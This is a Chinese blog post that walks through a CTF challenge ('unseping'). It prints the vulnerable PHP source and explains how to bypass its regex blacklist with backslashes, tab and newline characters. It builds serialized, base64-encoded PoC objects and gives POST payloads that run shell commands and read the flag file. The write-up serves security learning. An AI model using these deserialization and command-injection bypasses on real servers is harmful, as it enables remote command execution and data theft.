<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Web安全攻防世界04 unseping（江苏工匠杯） - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Web安全攻防世界04 unseping（江苏工匠杯）" />
<meta property="og:description" content="问题描述 依旧是参考大佬们的WP，时隔多日对原来的博文内容进行了修改与补充，内容小白友好~
原因分析： 按照惯例，把源码贴在这里逐行不靠谱地分析一下~
&lt;?php highlight_file(__FILE__); //高亮显示文件 class ease{ //创建 名称为 “ease” 的类 private $method; //创建一个私有成员变量 method (私有成员变量只能在类内访问) private $args; //创建一个私有成员变量 arg function __construct($method, $args) { //初始化对象 method、args $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct(){ //在脚本关闭时执行以下语句 if (in_array($this-&gt;method, array(&#34;ping&#34;))) { //如果 数组ping中存在method的值 call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); //返回回调函数的结果 } } function ping($ip){ //数组ping(变量ip) exec($ip, $result); //执行外部程序：查看ip var_dump($result); //输出ip查询结果 } function waf($str){ //防火墙（变量str） if (!preg_match_all(&#34;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&#34;, $str, $pat_array)) { return $str; //如果str中不含有上述字符，返回函数 } else { echo &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/21edd3418df1b7390a4b2d44870e8a4a/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-25T13:51:51+08:00" />
<meta property="article:modified_time" content="2023-02-25T13:51:51+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Web安全攻防世界04 unseping（江苏工匠杯）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>问题描述</h2> 
<p><img alt="" height="891" src="https://images2.imgbox.com/4e/50/2F8EtFgV_o.png" width="896"></p> 
<p>依旧是参考大佬们的WP，时隔多日对原来的博文内容进行了修改与补充，内容小白友好~</p> 
<hr> 
<h2><a id="_23"></a>原因分析：</h2> 
<p>按照惯例，把源码贴在这里逐行不靠谱地分析一下~</p> 
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__); //高亮显示文件

class ease{ //创建 名称为 “ease” 的类
    
    private $method; //创建一个私有成员变量 method (私有成员变量只能在类内访问)
    private $args;   //创建一个私有成员变量 arg
    function __construct($method, $args) { //初始化对象 method、args
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }
 
    function __destruct(){ //在脚本关闭时执行以下语句
        if (in_array($this-&gt;method, array("ping"))) { //如果 数组ping中存在method的值
            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); //返回回调函数的结果
        }
    } 
 
    function ping($ip){ //数组ping(变量ip)
        exec($ip, $result); //执行外部程序：查看ip
        var_dump($result); //输出ip查询结果
    }

    function waf($str){ //防火墙（变量str）
        if (!preg_match_all("/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str; //如果str中不含有上述字符，返回函数
        } else {
            echo "don't hack"; //否则的话，输出“don't hack”
        }
    }
 
    function __wakeup(){ //当类在外部执行反序列化时，执行此方法
        foreach($this-&gt;args as $k =&gt; $v) { //遍历输入字符，传递到防火墙中检查
            $this-&gt;args[$k] = $this-&gt;waf($v);
        }
    }   
}

$ctf=@$_POST['ctf']; //传参变量为ctf，传参方法为post
@unserialize(base64_decode($ctf)); //反序列化（以Base64的形式解码变量ctf）
?&gt;</code></pre> 
<p>解题思路如下:</p> 
<p>1 根据第14行 <strong>if (in_array($this-&gt;method, array("ping")));</strong></p> 
<p>   应该在数组的第一个变量method中写入<strong>"ping"</strong>，以使if的判断条件满足，从而执行回调函数~ </p> 
<p>2 根据第25行 <strong>if (!preg_match_all("/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array))</strong></p> 
<p>   应该在数组的第二个变量args中写入<strong>查询flag文件</strong>的语句，需要的关键词在waf里已经非常贴心地提示了（手动狗头）~</p> 
<hr> 
<h2><a id="_30"></a>解决方案：</h2> 
<p><strong>工具：hackbar</strong>（浏览器插件）或<strong>burpsuite </strong><span style="color:#a5a5a5;">（用于post传参~本文是以hackbar示例~）</span></p> 
<p><strong>参考：张桢</strong>的保姆级WP：</p> 
<p><strong>1  源码分析</strong></p> 
<p>题目的难点在于绕过这句话：<strong>if (!preg_match_all("/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array))</strong>，preg_match_all()执行全局正则表达式匹配，会搜索<strong>$str</strong>中<strong>/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/</strong>的正则式匹配结果，并输出到<strong>$pat_array</strong>中~</p> 
<p>本题<strong>"/(<span style="color:#6eaad7;">\|</span>|<span style="color:#ed7976;">&amp;</span>|<span style="color:#e6b223;">;</span>|<span style="color:#98c091;"> </span>|<span style="color:#6eaad7;">\/</span>|<span style="color:#ed7976;">cat</span>|<span style="color:#faa572;">flag</span>|<span style="color:#e6b223;">tac</span>|<span style="color:#98c091;">php</span>|<span style="color:#6eaad7;">ls</span>)/"</strong>是正则表达式，<strong>"//"</strong>表示字符串的开始与结束，\表示转义，|表示或运算；</p> 
<p>禁掉的内容为①<strong><span style="color:#6eaad7;">|</span></strong>(转义)②<strong><span style="color:#ed7976;">&amp;</span></strong>③<strong><span style="color:#e6b223;">;</span></strong>④<span style="color:#98c091;">空格</span>⑤<strong><span style="color:#6eaad7;">/</span></strong>(转义)⑥<strong><span style="color:#ed7976;">cat</span></strong>⑦<strong><span style="color:#faa572;">flag</span></strong>⑧<strong><span style="color:#e6b223;">tac</span></strong>⑨<strong><span style="color:#98c091;">php</span></strong>⑩<strong><span style="color:#6eaad7;">ls</span></strong></p> 
<p><span style="color:#a5a5a5;">如果有兴趣，正则表达式可参考右侧的链接：<a href="https://www.php.cn/php-weizijiaocheng-394075.html" rel="nofollow" title="php的正则表达式-PHP中文网">php的正则表达式-PHP中文网</a></span></p> 
<p>我们发现，他这一套正则表达式虽然出现了很多的\，但是都作为开头、结尾、转义消耗掉了，实际上根本没有禁掉\，是不是很意外~</p> 
<p><img alt="" height="487" src="https://images2.imgbox.com/b4/e5/sDJ8AzUx_o.png" width="1200"></p> 
<p> ↑在ls(linux命令，显示指定工作目录下之内容)中加入\，发现右侧直接输出了$str的值，而非don't hack，证明是成功绕过啦~同理，cat、flag、tac、php也可以在单词中加入转义字符\绕过~</p> 
<p></p> 
<p><strong>2  构造poc</strong></p> 
<p><strong>  $a = new ease("ping",array("l\s")); </strong></p> 
<p><strong>  poc分析：</strong>传入满足ease类型的对象<strong>$a</strong>（起别的名字也可以的~），要求采用两个变量：method、args。</p> 
<p>  1）method根据题目要求为 数组“ping”（根据源码第15行，回调函数中已经有array($this, $this-&gt;method)，因此无需再输入array()这个格式）；</p> 
<p>  2）args根据题目要求为执行语句，根据博文上述分析，写为array(<strong>"</strong>l\s<strong>"</strong>)；</p> 
<p>  3）另外根据题目第40行@unserialize(base64_decode($ctf));，变量传入的时候会进行编码和反序列化，因此<strong>$a</strong>需要序列化，且进行Base64编码，代码末尾需要再添加一行实现序列化与解码功能——</p> 
<p><strong>  echo serialize(base64_encode($a));</strong></p> 
<p><strong> </strong> 4）也可以在代码末尾增加一句代码检查序列化后的输出是否满足要求（非必要）——</p> 
<p>  <strong>echo serialize($a);</strong></p> 
<p>复制源码，将这几行添加到程序末尾（或者直接复制下面贴着的代码），在编辑器内运行，平时不怎么编程的胖友也可以试试在线编辑器~<a href="https://c.runoob.com/compile/1/" rel="nofollow" title="PHP 在线工具 | 菜鸟工具 (runoob.com)">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p> 
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);

class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }
 
    function __destruct(){
        if (in_array($this-&gt;method, array("ping"))) {
            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);
        }
    } 
 
    function ping($ip){
        exec($ip, $result);
        var_dump($result);
    }

    function waf($str){
        if (!preg_match_all("/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
        } else {
            echo "don't hack";
        }
    }
 
    function __wakeup(){
        foreach($this-&gt;args as $k =&gt; $v) {
            $this-&gt;args[$k] = $this-&gt;waf($v);
        }
    }   
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));

$a = new ease("ping",array("l\s"));
echo serialize($a);
echo base64_encode(serialize($a));
?&gt;</code></pre> 
<p> 运行结果如图，红线位置圈注的两行（&lt;/code&gt;之后，array(2)之前）就是代码执行结果~</p> 
<p><img alt="" height="1020" src="https://images2.imgbox.com/3d/48/KHuU2CAe_o.png" width="1200"></p> 
<p>F12调出开发者工具Hackbar，根据源代码39行<strong>$ctf=@$_POST['ctf'];</strong>，我们以<strong>post</strong>形式通过变量<strong>ctf</strong>传入编码的poc，如下图所示~</p> 
<pre><code class="language-php">ctf=Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJsXHMiO319</code></pre> 
<p><img alt="" height="1020" src="https://images2.imgbox.com/ed/ee/DZTeg6Pc_o.png" width="1200"></p> 
<p>此时页面最后一行提示了文件夹名称，flag_1s_here，那么下一步就是需要分为两行命令：</p> 
<p>1）<strong>cd flag_1s_here </strong>//打开文件<strong>flag_1s_here</strong>；</p> 
<p>2）<strong>ls //</strong>查询文件内容；</p> 
<p>大佬的payload如下~</p> 
<pre><code class="language-php">$a = new ease("ping",array("cd\x09fl\ag_1\s_here\x0al\s"));
echo serialize($a);
echo base64_encode(serialize($a));</code></pre> 
<p>分析一下payload："cd\x09fl\ag_1\s_here\x0al\s"，利用了两个特性：</p> 
<p>1）添加了\x09和\x0a。其中\x09是ASCII码16进制的制表符，用途相当于tab键，表示4个空格，用于绕过正则表达式中空格键的黑名单；\x0a是ASCII码的换行符，用于切换到第两行命令的执行。</p> 
<p><span style="color:#a5a5a5;">若有兴趣，其他ASCII码转义字符的介绍：<a href="https://www.cnblogs.com/cblx/p/12407694.html" rel="nofollow" title="php中的转义字符 - 充实地生活着">php中的转义字符 - 充实地生活着</a></span></p> 
<p> 2）<strong>preg_match() </strong>函数在第一次匹配后将会停止搜索，但<strong>preg_match_all() </strong>函数会一直匹配到结尾，本题中采用<strong>preg_match_all() </strong>就很适合多行命令的执行~</p> 
<p>实际payload绕过waf的输出如下图所示，与我们想要的输出结果一致，证明可用~</p> 
<p><img alt="" height="492" src="https://images2.imgbox.com/7f/0b/iYL7j8em_o.png" width="1200"></p> 
<p>在菜鸟编辑器<strong>第42行</strong>中用下列代码替换原来的poc~</p> 
<pre><code class="language-php">$a = new ease("ping",array("cd\x09fl\ag_1\s_here\x0al\s"));</code></pre> 
<p><img alt="" height="1020" src="https://images2.imgbox.com/07/b7/CHOUEqog_o.png" width="1200"></p> 
<p>绿色线是程序运行的结果，再次以post形式上传至题目的页面，运行后得到flag文件名~</p> 
<p><img alt="" height="1020" src="https://images2.imgbox.com/77/fe/ScjIj5sc_o.png" width="1200"></p> 
<p>此时页面最后一行提示了文件名flag_831b69012c67b35f.php，那么下一步就是——</p> 
<p><strong>cd flag_1s_here</strong> //查看文件夹flag_1s_here</p> 
<p><strong>cat  flag_831b69012c67b35f.php </strong>//查看flag_831b69012c67b35f.php文件</p> 
<p>同理，同一行命令中间采用\x09制表符替代空格的作用，前后两行命令之间采用\x0a替代换行的作用，cat、flag与php中插入\以绕过正则表达式~</p> 
<p>payload：cd\x09fl\ag_1\s_here\x0ac\at\x09fl\ag_831b69012c67b35f.p\hp</p> 
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);

class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this-&gt;method = $method;
        $this-&gt;args = $args;
    }
 
    function __destruct(){
        if (in_array($this-&gt;method, array("ping"))) {
            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);
        }
    } 
 
    function ping($ip){
        exec($ip, $result);
        var_dump($result);
    }

    function waf($str){
        if (!preg_match_all("/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
        } else {
            echo "don't hack";
        }
    }
 
    function __wakeup(){
        foreach($this-&gt;args as $k =&gt; $v) {
            $this-&gt;args[$k] = $this-&gt;waf($v);
        }
    }   
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));

$a = new ease("ping",array("cd\x09fl\ag_1\s_here\x0ac\at\x09fl\ag_831b69012c67b35f.p\hp"));
echo serialize($a);
echo base64_encode(serialize($a));
?&gt;</code></pre> 
<p>将上述代码复制到菜鸟编辑器，运行以后的结果是这样的~<img alt="" height="861" src="https://images2.imgbox.com/36/df/UZbZ8eFQ_o.png" width="1200"></p> 
<p> 检查一下输出，确认问题不大后依旧将<span style="color:#1c7331;"><u>poc</u></span>再次输入到页面中，得到flag~</p> 
<pre><code class="language-php">ctf=Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo1MDoiY2QJZmxcYWdfMVxzX2hlcmUKY1xhdAlmbFxhZ184MzFiNjkwMTJjNjdiMzVmLnBcaHAiO319</code></pre> 
<p><img alt="" height="1020" src="https://images2.imgbox.com/e0/ce/jSHaDuHF_o.png" width="1200"></p> 
<p> $cyberpeace{bd69cbe927b167a4f087d6e6ae4c09fa}</p> 
<p></p> 
<p>博文写得模糊或者有误之处，欢迎留言讨论与批评~</p> 
<p>码字不易，若有所帮助，可以点赞支持一下博主嘛？感谢~(●'◡'●)</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/f3232ca598978fc6856fe92d4d387d8d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">代码编写环境和编译器</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/99937de2be653a70620391f700a55616/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">结构体（算法）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>